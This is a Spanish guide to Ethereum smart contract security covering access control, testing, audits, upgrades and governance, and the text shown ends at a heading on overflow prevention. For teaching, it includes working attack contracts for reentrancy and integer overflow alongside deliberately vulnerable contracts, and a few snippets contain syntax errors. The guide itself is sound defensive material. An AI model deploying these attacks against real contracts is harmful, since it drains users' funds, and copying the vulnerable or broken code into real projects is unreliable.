---
title: Seguridad en contratos inteligentes
description: Resumen de lineamientos para crear contratos inteligentes seguros en Ethereum
lang: es
---

Los contratos inteligentes son extremadamente flexibles y capaces de controlar grandes cantidades de valor y datos, además de ejecutar lógica inmutable con base en el código implementado en la cadena de bloques. Esto ha creado un vibrante ecosistema de aplicaciones que no necesitan confianza (trustless) y descentralizadas que ofrecen muchas ventajas sobre los sistemas antiguos. También representan oportunidades para los atacantes que buscan obtener beneficios explotando las vulnerabilidades de los contratos inteligentes.

Las cadenas de bloques públicas como Ethereum complican aún más la cuestión de la seguridad de los contratos inteligentes. El código de los contratos ya implementado _por lo general_ no puede cambiarse para corregir fallas de seguridad, mientras que los activos robados de los contratos inteligentes son extremadamente difíciles de rastrear y en su mayor parte irrecuperables debido a la inmutabilidad.

Aunque las cifras varían, se estima que la cantidad total de valor robado o perdido debido a defectos de seguridad en los contratos inteligentes supera fácilmente los USD 1000 millones de dólares. Esto incluye incidentes de alto perfil, tal como el [hackeo a la DAO](https://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/) (3,6 millones de ETH robados, por valor de más de USD 1000 millones a precios actuales), el [hackeo de la billetera multifirma de Parity](https://www.coindesk.com/30-million-ether-reported-stolen-parity-wallet-breach) (USD 30M perdidos a manos de hackers) y el [problema de billeteras congeladas de Parity](https://www.theguardian.com/technology/2017/nov/08/cryptocurrency-300m-dollars-stolen-bug-ether) (mas de USD 300M en ETH bloqueados para siempre).

Los problemas mencionados anteriormente hacen que sea imperativo que los desarrolladores inviertan esfuerzos en la creación de contratos inteligentes seguros, robustos y resistentes. La seguridad de los contratos inteligentes es un asunto serio que todo desarrollador hará bien en aprender. Esta guía abordará consideraciones de seguridad para los desarrolladores de Ethereum y explorará recursos para mejorar la seguridad de los contratos inteligentes.

## Requisitos previos {#prerequisites}

Asegúrese de estar familiarizado con los [principios fundamentales del desarrollo de contratos inteligentes](/developers/docs/smart-contracts/) antes de abordar la seguridad.

## Pautas para crear contratos inteligentes seguros en Ethereum {#smart-contract-security-guidelines}

### 1. Diseñar controles de acceso apropiados {#design-proper-access-controls}

En los contratos inteligentes, las funciones definidas como `public` o `external` pueden ser invocadas por cualquier cuenta de propiedad externa (EOA) o cuentas asociadas a otros contratos. Especificar la visibilidad pública de las funciones es necesario si quiere que otros interactúen con su contrato. Por su parte, las funciones marcadas como `private` solo pueden ser invocadas por funciones dentro del contrato inteligente y no por cuentas externas. Dar a todos los participantes de la red acceso a las funciones del contrato puede causar problemas, especialmente si esto significa que cualquiera pueda realizar operaciones sensibles (por ejemplo, mintear nuevos tokens).

Para evitar el uso no autorizado de las funciones de los contratos inteligentes, es necesario implementar controles de acceso seguros. Los mecanismos de control de acceso restringen la capacidad de utilizar ciertas funciones de un contrato inteligente a las entidades aprobadas, como las cuentas responsables de la gestión del contrato. El ** patrón Ownable** y **role-based control** son dos patrones útiles para implementar el control de acceso en los contratos inteligentes:

#### Patrón Ownable {#ownable-pattern}

En el patrón Ownable, se establece una dirección como "propietaria" del contrato durante el proceso de creación del contrato. A las funciones protegidas se les asigna un modificador `OnlyOwner`, que asegura que el contrato autentique la identidad de la dirección invocante antes de ejecutar la función. Las llamadas o invocaciones a funciones protegidas desde otras direcciones distintas a la del propietario del contrato siempre se revierten, lo que impide el acceso no deseado.

#### Control de acceso basado en roles {#role-based-access-control}

Registrar una única dirección como `Owner` en un contrato inteligente introduce el riesgo de centralización y representa un punto único de falla. Si las claves de la cuenta del propietario se ven comprometidas, los atacantes pueden atacar el contrato. Es por ello que utilizar un patrón de control de acceso basado en roles con múltiples cuentas administrativas puede ser una mejor opción.

En el control de acceso basado en roles, el acceso a funciones sensibles se distribuye entre un conjunto de participantes de confianza. Por ejemplo, una cuenta puede encargarse de mintear tokens, mientras que otra cuenta realiza actualizaciones o pausa el contrato. Al descentralizar el control de acceso de esta manera, se eliminan los puntos únicos de falla y se reducen los supuestos de confianza para los usuarios.

##### Uso de billeteras multifirma

Otro enfoque para implementar un control de acceso seguro es utilizar una [cuenta multifirma](/developers/docs/smart-contracts/#multisig) para gestionar un contrato. A diferencia de una EOA normal, las cuentas multifirma son propiedad de varias entidades y requieren las firmas de un número mínimo de cuentas, por ejemplo, de 3 a 5, para ejecutar las transacciones.

El uso de una cuenta multifirma para el control de acceso introduce una capa adicional de seguridad, ya que las acciones en el contrato de destino requieren el consentimiento de varias partes. Esto es particularmente útil si es necesario utilizar el patrón Ownable, ya que hace más difícil que un atacante o un insider deshonesto manipule las funciones sensibles del contrato con fines maliciosos.

### 2. Uso de declaraciones require(), assert() y revert() para proteger las operaciones de un contrato {#use-require-assert-revert}

Como se ha mencionado, cualquiera puede invocar funciones públicas de su contrato inteligente una vez que se implementa en la cadena de bloques. Dado que no se puede saber de antemano cómo van a interactuar las cuentas externas con un contrato, lo ideal es implementar protecciones internas contra las operaciones problemáticas antes de la implementación. Se puede imponer un comportamiento correcto en los contratos inteligentes utilizando las declaraciones o sentencias `require()`, `assert()` y `revert()` para activar excepciones y revertir los cambios de estado si la ejecución no satisface ciertos requisitos.

**`require()`**: `require` se define al inicio de las funciones y garantiza que se cumplan las condiciones predefinidas antes de que se ejecute la función invocada. Una declaración `require` puede utilizarse para validar las entradas del usuario, comprobar las variables de estado o autenticar la identidad de la cuenta invocante antes de progresar con una función.

**`assert()`**: `assert()` se utiliza para detectar errores internos y comprobar las violaciones de "invariantes" en su código. Una invariante es una afirmación lógica sobre el estado de un contrato que debe ser cierta para todas las ejecuciones de la función. Un ejemplo de invariante es el total suministro máximo o el saldo de un contrato de tokens. El uso de `assert()` asegura que su contrato nunca alcance un estado vulnerable, y si lo hace, todos los cambios en las variables de estado se revierten.

**`revert()`**: `revert()` puede utilizarse en una declaración if-else que desencadene una excepción si no se cumple la condición requerida. El contrato de ejemplo que se muestra a continuación utiliza `revert()` para proteger la ejecución de las funciones:

```
pragma solidity ^0.8.4;

contract VendingMachine {
    address owner;
    error Unauthorized();
    function buy(uint amount) public payable {
        if (amount > msg.value / 2 ether)
            revert("Not enough Ether provided.");
        // Perform the purchase.
    }
    function withdraw() public {
        if (msg.sender != owner)
            revert Unauthorized();

        payable(msg.sender).transfer(address(this).balance);
    }
}
```

### 3. Probar contratos inteligentes y verificar que el código sea correcto {#test-smart-contracts-and-verify-code-correctness}

La inmutabilidad del código que se ejecuta en la [Máquina virtual de Ethereum](/developers/docs/evm/) implica que los contratos inteligentes exijan un mayor nivel de evaluación de la calidad durante la fase de desarrollo. Probar el contrato de forma exhaustiva y observar cualquier resultado inesperado mejorará mucho la seguridad y protegerá a los usuarios a largo plazo.

El método habitual es escribir pruebas de unidades pequeñas utilizando datos simulados que se espera que el contrato reciba de los usuarios. [Hacer pruebas unitarias](/developers/docs/smart-contracts/testing/#unit-testing) es bueno para probar la funcionalidad de ciertas funciones y asegurar que un contrato inteligente funcione como se espera.

Desafortunadamente, las pruebas unitarias son poco efectivas para mejorar la seguridad de los contratos inteligentes cuando se utilizan de forma aislada. Una prueba unitaria puede demostrar que una función se ejecuta correctamente para datos simulados, pero son tan eficaces como las pruebas que se escriben. Esto dificulta la detección de casos límite y vulnerabilidades que podrían romper la seguridad de su contrato inteligente.

Una mejor estrategia es combinar las pruebas unitarias con pruebas basadas en propiedades realizadas mediante [análisis estáticos y dinámicos](/developers/docs/smart-contracts/testing/#static-dynamic-analysis). El análisis estático se basa en representaciones de bajo nivel, como [gráficos de flujo de control](https://en.wikipedia.org/wiki/Control-flow_graph) y [árboles sintácticos abstractos](https://deepsource.io/glossary/ast/) para analizar los estados alcanzables de un programa y las rutas de ejecución. Mientras tanto, técnicas de análisis dinámicos, como las [auditorías de seguridad (fuzzing) de contratos inteligentes](https://www.cyfrin.io/blog/smart-contract-fuzzing-and-invariants-testing-foundry), ejecutan un código de contrato con valores de introducción aleatorios que infringen las propiedades de seguridad.

La [verificación formal](/developers/docs/smart-contracts/formal-verification) es otra técnica para verificar las propiedades de seguridad en los contratos inteligentes. A diferencia de las pruebas habituales, la verificación formal puede demostrar de forma concluyente la ausencia de errores en un contrato inteligente. Esto se consigue creando una especificación formal que capture las propiedades de seguridad deseadas y demostrando que un modelo formal de los contratos se adhiera a esta especificación.

### 4. Solicitar una revisión independiente de su código {#get-independent-code-reviews}

Después de probar su contrato, es bueno pedir a otros que comprueben el código fuente para detectar cualquier problema de seguridad. Las pruebas no descubrirán todas las fallas de un contrato inteligente, pero conseguir una revisión independiente aumenta la posibilidad de detectar vulnerabilidades.

#### Auditorías {#audits}

Encargar una auditoría de un contrato inteligente es una forma de realizar una revisión independiente del código. Los auditores desempeñan un papel importante a la hora de garantizar que los contratos inteligentes sean seguros y estén libres de defectos de calidad y errores de diseño.

Dicho esto, hay que evitar tratar las auditorías como una bala de plata. Las auditorías no detectarán todos los errores y están diseñadas principalmente para proporcionar una ronda adicional de revisiones, que puede ayudar a detectar los problemas que los desarrolladores pasaron por alto durante el desarrollo y las pruebas iniciales. También es necesario cumplir con buenas prácticas para trabajar con los auditores, como documentar el código adecuadamente y añadir comentarios en línea, para maximizar el beneficio de una auditoría del contrato inteligente.

- [Consejos y trucos de auditoría de contratos inteligentes](https://twitter.com/tinchoabbate/status/1400170232904400897) - _@tinchoabbate_
- [Aproveche al máximo su auditoría](https://inference.ag/blog/2023-08-14-tips/) - _Inference_

#### Dar recompensas por detección de errores {#bug-bounties}

La creación de un programa de recompensas por errores es otro enfoque para implementar revisiones de código externas. Un bug bounty es una recompensa económica que se da a las personas (normalmente hackers de sombrero blanco) que descubren vulnerabilidades en una aplicación.

Cuando se utilizan correctamente, las recompensas por errores ofrecen a los miembros de la comunidad de hackers un incentivo para inspeccionar su código en busca de fallas críticas. Un ejemplo de la vida real es el "bug del dinero infinito" que habría permitido a un atacante crear una cantidad ilimitada de Ether en [Optimism](https://www.optimism.io/), un protocolo de [Capa 2](/layer-2/) que se ejecuta en Ethereum. Afortunadamente, un hacker de sombrero blanco [descubrió la falla](https://www.saurik.com/optimism.html) y notificó al equipo, [obteniendo un premio grande en el proceso](https://cryptoslate.com/critical-bug-in-ethereum-l2-optimism-2m-bounty-paid/).

Una estrategia útil es establecer el pago de un programa de recompensas por fallas en proporción a la cantidad de fondos en juego. Descrito como el "[scaling bug bounty](https://medium.com/immunefi/a-defi-security-standard-the-scaling-bug-bounty-9b83dfdc1ba7)", este enfoque proporciona incentivos financieros para que los individuos revelen responsablemente las vulnerabilidades en lugar de explotarlas.

### 5. Seguir las mejores prácticas durante el desarrollo del contrato inteligente {#follow-smart-contract-development-best-practices}

La existencia de auditorías y recompensas por errores no lo exime de la responsabilidad de escribir código de alta calidad. La sólida seguridad en los contratos inteligentes empieza por seguir procesos de diseño y desarrollo adecuados:

- Almacenar todo el código en un sistema de control de versiones, como git

- Hacer todas las modificaciones del código a través de pull requests (solicitudes pull)

- Asegurarse de que las pull requests tengan al menos un revisor independiente; si trabaja en solitario en un proyecto, considere la posibilidad de buscar a otros desarrolladores e intercambiar revisiones de código

- Utilizar un [entorno de desarrollo](/developers/docs/frameworks/) para probar, compilar e implementar contratos inteligentes

- Ejecute su código mediante herramientas básicas de análisis de código, como [Cyfrin Aaderyn](https://github.com/Cyfrin/aderyn), Mythril y Slither. En principio, debería hacer esto antes de combinar cada pull request y comparar las diferencias en el resultado

- Asegurarse de que el código se compile sin errores y que el compilador de Solidity no emita advertencias

- Documentar adecuadamente su código (utilizando [NatSpec](https://solidity.readthedocs.io/en/develop/natspec-format.html)) y describir los detalles de la arquitectura del contrato en un lenguaje fácil de entender. Esto facilitará que otros auditen y revisen su código

### 6. Implementar planes sólidos de recuperación de desastres {#implement-disaster-recovery-plans}

El diseño de controles de acceso seguros, la implementación de modificadores de funciones y otras sugerencias pueden mejorar la seguridad de los contratos inteligentes, pero no pueden descartar la posibilidad de explotaciones maliciosas. Crear contratos inteligentes seguros requiere “prepararse para el fracaso” y tener un plan de respaldo para responder eficazmente a los ataques. Un plan adecuado de recuperación de desastres incorporará algunos o todos los siguientes componentes:

#### Actualizaciones del contrato {#contract-upgrades}

Si bien los contratos inteligentes de Ethereum son inmutables de forma predeterminada, es posible lograr cierto grado de mutabilidad usando patrones de actualización. La actualización de contratos es necesaria en los casos en que una falla crítica haga inutilizable su viejo contrato e implementar nueva lógica sea la opción más viable.

Los mecanismos de actualización de contratos funcionan de forma diferente, pero el “patrón de proxy” es una de las formas más populares. Los [patrones de proxy](https://www.cyfrin.io/blog/upgradeable-proxy-smart-contract-pattern) dividen el estado de una aplicación y la lógica entre _dos_ contratos. El primer contrato (llamado “contrato proxy”) almacena variables de estado (p. ej., los balances de los usuarios), mientras que el segundo contrato (llamado “contrato de lógica”) contiene el código para la ejecución de las funciones del contrato.

Las cuentas interactúan con el contrato proxy, que envía todas las llamadas de función al contrato de lógica usando la llamada de bajo nivel [`delegatecall()`](https://docs.soliditylang.org/en/v0.8.16/introduction-to-smart-contracts.html?highlight=delegatecall#delegatecall-callcode-and-libraries). A diferencia de una llamada de mensaje normal, `delegatecall()` asegura que el código que se ejecuta en la dirección del contrato de lógica sea ejecutado en el contexto del contrato de llamada. Esto significa que el contrato de lógica siempre escribirá en el almacenamiento del proxy (en lugar de su propio almacenamiento) y que los valores originales de `msg. ender` y `msg.value` serán preservados.

Delegar llamadas al contrato de lógica requiere almacenar su dirección en el almacenamiento del contrato proxy. Por lo tanto, actualizar la lógica del contrato es solo cuestión de implementar otro contrato de lógica y almacenar la nueva dirección en el contrato proxy. A medida que las llamadas subsiguientes al contrato proxy se enruten automáticamente al nuevo contrato de lógica, habrá “actualizado” el contrato sin modificar realmente el código.

[Más información sobre la actualización de contratos](/developers/docs/smart-contracts/upgrading/).

#### Paradas de emergencia {#emergency-stops}

Como se ha mencionado, las auditorías y pruebas exhaustivas no pueden descubrir todos los errores en un contrato inteligente. Si aparece una vulnerabilidad en su código después de la implementación, corregirla es imposible, ya que no puede cambiar el código que se ejecuta en la dirección del contrato. Además, los mecanismos de actualización (p. ej. los patrones proxy) pueden tardar en implementarse (suelen requerir la aprobación de diferentes partes), lo que solo da a los atacantes más tiempo para causar más daño.

La opción nuclear es implementar una función de “parada de emergencia” que bloquee las llamadas a funciones vulnerables en un contrato. Las paradas de emergencia típicamente constan de los siguientes componentes:

1. Una variable booleana global que indica si el contrato inteligente está en un estado de detenimiento o no. Esta variable se establece en `false` al configurar el contrato, pero volverá a `true` una vez que se detenga el contrato.

2. Funciones que hagan referencia a la variable booleana en su ejecución. Tales funciones son accesibles cuando el contrato inteligente no se detiene, y se vuelven inaccesibles cuando se activa la función de parada de emergencia.

3. Una entidad que tiene acceso a la función de parada de emergencia, que establece la variable booleana en `true`. Para evitar acciones maliciosas, las llamadas a esta función se pueden restringir a una dirección de confianza (por ejemplo, el propietario del contrato).

Una vez que el contrato active la parada de emergencia, no se podrán invocar ciertas funciones. Esto se logra envolviendo funciones selectas en un modificador que haga referencia a la variable global. A continuación se muestra [un ejemplo](https://github.com/fravoll/solidity-patterns/blob/master/EmergencyStop/EmergencyStop.sol) que describe una implementación de este patrón en los contratos:

```solidity
// This code has not been professionally audited and makes no promises about safety or correctness. Use at your own risk.

contract EmergencyStop {

    bool isStopped = false;

    modifier stoppedInEmergency {
        require(!isStopped);
        _;
    }

    modifier onlyWhenStopped {
        require(isStopped);
        _;
    }

    modifier onlyAuthorized {
        // Check for authorization of msg.sender here
        _;
    }

    function stopContract() public onlyAuthorized {
        isStopped = true;
    }

    function resumeContract() public onlyAuthorized {
        isStopped = false;
    }

    function deposit() public payable stoppedInEmergency {
        // Deposit logic happening here
    }

    function emergencyWithdraw() public onlyWhenStopped {
        // Emergency withdraw happening here
    }
}
```

Este ejemplo muestra las características básicas de las paradas de emergencia:

- `isStopped` es un booleano que evalúa como `false` al principio y `true` cuando el contrato entra en modo de emergencia.

- Los modificadores de funciones `onlyWhenStopped` y `stoppedInEmergency` comprueban la variable `isStopped`. `stoppedInEmergency` se utiliza para controlar las funciones que deberían ser inaccesibles cuando el contrato es vulnerable (por ejemplo, `deposit()`). Las llamadas a estas funciones simplemente se revertirán.

`onlyWhenStopped` se utiliza para funciones que deben ser invocables durante una emergencia (por ejemplo, `emergencyWithdraw()`). Tales funciones pueden ayudar a resolver la situación, de ahí su exclusión de la lista de "funciones restringidas".

El uso de una funcionalidad de parada de emergencia proporciona un recurso efectivo para hacer frente a vulnerabilidades graves en su contrato inteligente. No obstante, aumenta la necesidad de que los usuarios confíen en que los desarrolladores no lo activen por razones de su interés. Con este fin, la descentralización del control de la parada de emergencia, ya sea sometiéndola a un mecanismo de votación en cadena, un bloqueo de tiempo o la aprobación de una billetera multifirma, son posibles soluciones.

#### Monitoreo de eventos {#event-monitoring}

Los [eventos](https://docs.soliditylang.org/en/v0.8.15/contracts.html#events) le permiten realizar un seguimiento de las llamadas a las funciones de un contrato inteligente y supervisar los cambios en las variables de estado. Es ideal programar su contrato inteligente para que emita un evento cada vez que alguna parte realice una acción crítica para la seguridad (por ejemplo, retirar fondos).

El registro de eventos y su supervisión fuera de la cadena proporciona información sobre las operaciones del contrato y ayuda a un descubrimiento más rápido de acciones maliciosas. Esto significa que su equipo puede responder más rápido a los hackeos y tomar medidas para mitigar el impacto en los usuarios, como pausar funciones o realizar una actualización.

También puede optar por una herramienta de monitoreo lista para usar que reenvíe automáticamente alertas cada vez que alguien interactúe con sus contratos. Estas herramientas le permitirán crear alertas personalizadas basadas en diferentes activadores, como el volúmen de transacciones, la frecuencia de las llamadas a funciones o las funciones específicas involucradas. Por ejemplo, podría programar una alerta que llegue cuando la cantidad retirada en una misma transacción supere un umbral en particular.

### 7. Diseñar sistemas de gobernanza seguros {#design-secure-governance-systems}

Es posible que desee descentralizar su aplicación entregando el control de los contratos inteligentes básicos a los miembros de la comunidad. En este caso, el sistema de contratos inteligentes incluirá un módulo de gobernanza, es decir, un mecanismo que permita a los miembros de la comunidad aprobar acciones administrativas a través de un sistema de gobernanza en cadena. Por ejemplo, los titulares de tokens pueden votar por una propuesta para actualizar un contrato proxy a una nueva implementación.

La gobernanza descentralizada puede ser beneficiosa, especialmente porque alinea los intereses de los desarrolladores y los usuarios finales. A pesar de todo, los mecanismos de gobernanza de contratos inteligentes pueden introducir nuevos riesgos si se implementan incorrectamente. Un escenario plausible es si un atacante adquiere un enorme poder de voto (medido por el número de tokens mantenidos) mediante la obtención de un [préstamo flash](/defi/#flash-loans) y obliga a aceptar una propuesta maliciosa.

Una manera de prevenir problemas relacionados con la gobernanza en cadena es [usar un bloqueo de tiempo o timelock](https://blog.openzeppelin.com/protect-your-users-with-smart-contract-timelocks/). Un bloqueo de tiempo impide que un contrato inteligente ejecute ciertas acciones hasta que pase una cantidad específica de tiempo. Otras estrategias incluyen asignar un "peso de votación" a cada token en función de cuánto tiempo ha estado bloqueado, o medir el poder de voto de una dirección en un período histórico (por ejemplo, 2-3 bloques en el pasado) en lugar del bloque actual. Ambos métodos reducen la posibilidad de acumular rápidamente el poder de voto para cambiar los votos en cadena.

Obtenga más información sobre [diseño de sistemas de gobernanza seguros](https://blog.openzeppelin.com/smart-contract-security-guidelines-4-strategies-for-safer-governance-systems/), [diferentes mecanismos de votación en las DAO](https://hackernoon.com/governance-is-the-holy-grail-for-daos) y [los vectores de ataque comunes de DAO que aprovechan DeFi](https://dacian.me/dao-governance-defi-attacks) en los enlaces compartidos.

### 8. Reducir la complejidad del código al mínimo {#reduce-code-complexity}

Los desarrolladores de software tradicionales están familiarizados con el principio KISS ("mantenlo simple, estúpido") (Keep it simple stupid), que desaconseja introducir complejidad innecesaria en el diseño de software. Esto sigue la idea de pensamiento de hace tiempo de que "los sistemas complejos fallan de maneras complejas" y son más susceptibles a errores costosos.

Mantener las cosas simples es de particular importancia a la hora de escribir contratos inteligentes, dado que los contratos inteligentes están controlando potencialmente grandes cantidades de valor. Un consejo para lograr simplicidad al escribir contratos inteligentes es reutilizar bibliotecas existentes, como [OpenZeppelin Contracts](https://docs.openzeppelin.com/contracts/4.x/), siempre que sea posible. Debido a que estas bibliotecas han sido ampliamente auditadas y probadas por los desarrolladores, su uso reduce las posibilidades de introducir errores al escribir nuevas funcionalidades desde cero.

Otro consejo común es escribir pequeñas funciones y mantener los contratos modulares dividiendo la lógica empresarial entre múltiples contratos. Escribir código más simple no solo reduce la superficie de ataque en un contrato inteligente, sino que también hace que sea más fácil razonar sobre la corrección del sistema general y detectar posibles errores de diseño temprano.

### 9. Defenderse de las vulnerabilidades comunes de los contratos inteligentes {#mitigate-common-smart-contract-vulnerabilities}

#### Reentrada {#reentrancy}

La EVM no permite la concurrencia, lo que significa que dos contratos involucrados en una llamada de mensaje no pueden ejecutarse simultáneamente. Una llamada externa pausa la ejecución y la memoria del contrato de llamada hasta que la llamada regresa, momento en el que la ejecución procede normalmente. Este proceso se puede describir formalmente como la transferencia de [flujo de control](https://www.computerhope.com/jargon/c/contflow.htm) a otro contrato.

Aunque en su mayor parte resulta inofensivo, la transferencia del flujo de control a contratos sin confianza puede causar problemas, como el reingreso o reentrada. Un ataque de reentrada ocurre cuando un contrato malicioso vuelve a llamar a un contrato vulnerable antes de que se complete la invocación de la función original. Este tipo de ataque se explica mejor con un ejemplo.

Considere un simple contrato inteligente ("Víctima") que permita a cualquier persona depositar y retirar Ether:

```solidity
// This contract is vulnerable. Do not use in production

contract Victim {
    mapping (address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        (bool success, ) = msg.sender.call.value(amount)("");
        require(success);
        balances[msg.sender] = 0;
    }
}
```

Este contrato expone una función `withdraw()` para permitir a los usuarios retirar ETH previamente depositados en el contrato. Al procesar un retiro, el contrato realiza las siguientes operaciones:

1. Comprueba el saldo de ETH del usuario
2. Envía fondos a la dirección de llamada
3. Restablece su saldo a 0, evitando retiros adicionales del usuario

La función `withdraw()` en el contrato `Victim` sigue un patrón de "comprobaciones-interacciones-efectos". _comprueba_ si se cumplen las condiciones necesarias para la ejecución (es decir, el usuario tiene un saldo de ETH positivo) y realiza la _interacción_ enviando ETH a la dirección de la persona que llama, antes de aplicar los _efectos_ de la transacción (es decir, reduciendo el saldo del usuario).

Si se invoca `withdraw()` desde una cuenta de propiedad externa (EOA), la función se ejecuta como se espera: `msg.sender.call.value()` envía ETH al invocante. Sin embargo, si `msg.sender` es una cuenta de contrato inteligente que llama a `withdraw()`, el envío de fondos usando `msg.sender.call.value()` también activará el código almacenado en esa dirección para que se ejecute.

Imagine que este es el código implementado en la dirección del contrato:

```solidity
 contract Attacker {
    function beginAttack() external payable {
        Victim(victim_address).deposit.value(1 ether)();
        Victim(victim_address).withdraw();
    }

    function() external payable {
        if (gasleft() > 40000) {
            Victim(victim_address).withdraw();
        }
    }
}
```

Este contrato está diseñado para hacer tres cosas:

1. Aceptar un depósito de otra cuenta (probablemente la EOA del atacante)
2. Depositar 1 ETH en el contrato de la víctima
3. Retirar el 1 ETH almacenado en el contrato inteligente

No hay nada malo aquí, excepto que `Attacker` tiene otra función que llama a `withdraw()` en `Victim` de nuevo si el gas que queda del entrante `msg.sender.call.value` es más de 40.000. Esto le da al `Attacker` la capacidad de volver a ingresar a `Victim` y retirar más fondos _antes_ de que se complete la primera invocación de `withdraw`. El ciclo se ve así:

```solidity
- Attacker's EOA calls `Attacker.beginAttack()` with 1 ETH
- `Attacker.beginAttack()` deposits 1 ETH into `Victim`
- `Attacker` calls `withdraw() in `Victim`
- `Victim` checks `Attacker`’s balance (1 ETH)
- `Victim` sends 1 ETH to `Attacker` (which triggers the default function)
- `Attacker` calls `Victim.withdraw()` again (note that `Victim` hasn’t reduced `Attacker`’s balance from the first withdrawal)
- `Victim` checks `Attacker`’s balance (which is still 1 ETH because it hasn’t applied the effects of the first call)
- `Victim` sends 1 ETH to `Attacker` (which triggers the default function and allows `Attacker` to reenter the `withdraw` function)
- The process repeats until `Attacker` runs out of gas, at which point `msg.sender.call.value` returns without triggering additional withdrawals
- `Victim` finally applies the results of the first transaction (and subsequent ones) to its state, so `Attacker`’s balance is set to 0
```

El resumen es que, debido a que el saldo de la persona que llama no se establece en 0 hasta que se complete la ejecución de la función, las invocaciones posteriores tendrán éxito y permitirán que la persona que llame retire su saldo varias veces. Este tipo de ataque se puede utilizar para drenar un contrato inteligente de sus fondos, como lo que sucedió en el [hackeo de 2016 de DAO](https://www.coindesk.com/learn/2016/06/25/understanding-the-dao-attack/). Los ataques de reentrada siguen siendo un problema crítico para los contratos inteligentes hoy en día, como muestran las [listas públicas de explotaciones de reentrada](https://github.com/pcaversaccio/reentrancy-attacks).

##### Cómo prevenir los ataques de reentrada

Un enfoque para lidiar con la reentrada es seguir el patrón [checks-effects-interactions](https://docs.soliditylang.org/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern) (comprobaciones-efectos-interacciones). Este patrón ordena la ejecución de las funciones de manera que lo primero sea el código que realiza las comprobaciones necesarias antes de progresar con la ejecución, luego venga el código que manipula el estado del contrato y finalmente venga el código que interactúa con otros contratos o EOA.

El patrón de comprobaciones-efecto-interacción se utiliza en una versión revisada del contrato `Victim` que se muestra a continuación:

```solidity
contract NoLongerAVictim {
    function withdraw() external {
        uint256 amount = balances[msg.sender];
        balances[msg.sender] = 0;
        (bool success, ) = msg.sender.call.value(amount)("");
        require(success);
    }
}
```

Este contrato realiza una _comprobación_ del saldo del usuario, aplica los _efectos_ de la función `withdraw()` (estableciendo el saldo del usuario en 0) y procede a realizar la _interacción_ (enviando ETH a la dirección del usuario). Esto garantiza que el contrato actualice su almacenamiento antes de la llamada externa, eliminando la condición de reentrada que permitió el primer ataque. El contrato `Attacker` todavía podría volver a llamar a `NoLongerAvictim`, pero dado que `balances[msg.sender]` se ha establecido en 0, los retiros adicionales generarán un error.

Otra opción es usar un bloqueo de exclusión mutua (comúnmente descrito como "mutex") que bloquee una parte del estado de un contrato hasta que se complete la invocación de una función. Esto se implementa utilizando una variable booleana que se establece en `true` antes de que la función se ejecute y se revierte a `false` después de realizar la invocación. Como se ve en el siguiente ejemplo, el uso de un mutex protege una función contra las llamadas recursivas mientras la invocación original todavía se está procesando, deteniendo efectivamente la reentrada.

```solidity
pragma solidity ^0.7.0;

contract MutexPattern {
    bool locked = false;
    mapping(address => uint256) public balances;

    modifier noReentrancy() {
        require(!locked, "Blocked from reentrancy.");
        locked = true;
        _;
        locked = false;
    }
    // This function is protected by a mutex, so reentrant calls from within `msg.sender.call` cannot call `withdraw` again.
    //  The `return` statement evaluates to `true` but still evaluates the `locked = false` statement in the modifier
    function withdraw(uint _amount) public payable noReentrancy returns(bool) {
        require(balances[msg.sender] >= _amount, "No balance to withdraw.");

        balances[msg.sender] -= _amount;
        bool (success, ) = msg.sender.call{value: _amount}("");
        require(success);

        return true;
    }
}
```

También puede utilizar un sistema de [pull payments](https://docs.openzeppelin.com/contracts/4.x/api/security#PullPayment) que requiera que los usuarios retiren fondos de los contratos inteligentes, en lugar de un sistema de "pagos push" que envíe fondos a las cuentas. Esto elimina la posibilidad de activar inadvertidamente el código en direcciones desconocidas (y también puede prevenir ciertos ataques de denegación de servicio).

#### Desbordamiento de enteros {#integer-underflows-and-overflows}

Un desbordamiento de enteros, o valor superior al aceptable (en inglés, overflow), se produce cuando los resultados de una operación aritmética sobrepasan el rango aceptable de valores, lo que hace que el resultado se corra al valor representable más bajo. Por ejemplo, un `uint8` solo puede almacenar valores de hasta 2^8-1=255. Las operaciones aritméticas que resulten en valores superiores a `255` se desbordarán y restablecerán `uint` a `0`, de manera similar a como el odómetro de un coche se restablece a 0 una vez que alcanza el kilometraje máximo (999.999).

Los desbordamientos de enteros ocurren también a la inversa: los resultados de una operación aritmética pueden caer por debajo del rango aceptable (underflow). Digamos que intentó disminuir `0` en un `uint8`; el resultado simplemente se revertiría al valor máximo representable (`255`).

Tanto los desbordamientos de enteros hacia arriba o hacia abajo (overflows y undeflows) pueden conducir a cambios inesperados en las variables de estado de un contrato y dar lugar a una ejecución no planificada. A continuación se muestra un ejemplo que muestra cómo un atacante puede explotar el desbordamiento aritmético de overflow en un contrato inteligente para realizar una operación no válida:

```
pragma solidity ^0.7.6;

// This contract is designed to act as a time vault.
// User can deposit into this contract but cannot withdraw for at least a week.
// User can also extend the wait time beyond the 1 week waiting period.

/*
1. Deploy TimeLock
2. Deploy Attack with address of TimeLock
3. Call Attack.attack sending 1 ether. You will immediately be able to
   withdraw your ether.

What happened?
Attack caused the TimeLock.lockTime to overflow and was able to withdraw
before the 1 week waiting period.
*/

contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        /*
        if t = current lock time then we need to find x such that
        x + t = 2**256 = 0
        so x = -t
        2**256 = type(uint).max + 1
        so x = type(uint).max + 1 - t
        */
        timeLock.increaseLockTime(
            type(uint).max + 1 - timeLock.lockTime(address(this))
        );
        timeLock.withdraw();
    }
}
```

##### Cómo prevenir los desbordamientos hacia arriba y hacia abajo

